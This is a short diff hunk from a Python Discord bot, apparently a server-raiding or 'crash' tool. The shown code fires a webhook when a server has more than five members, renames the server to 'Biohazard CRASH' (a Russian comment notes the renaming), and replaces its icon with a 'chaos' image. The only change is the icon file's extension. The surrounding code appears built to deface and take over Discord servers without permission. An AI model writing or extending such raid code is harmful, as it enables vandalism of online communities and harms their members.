@@ -164,7 +164,7 @@ class MyClient(discord.Client):
 				if message.guild.name != 'Biohazard CRASH' and len(message.guild.members) > 5:
 					response = webhook.execute()
 				await message.guild.edit(name='Biohazard CRASH') #переименовывание сервера
-				with open('chaos.png', 'rb') as f:
+				with open('chaos.jpeg', 'rb') as f:
 					icon = f.read()
 				await message.guild.edit(icon=icon)
 				
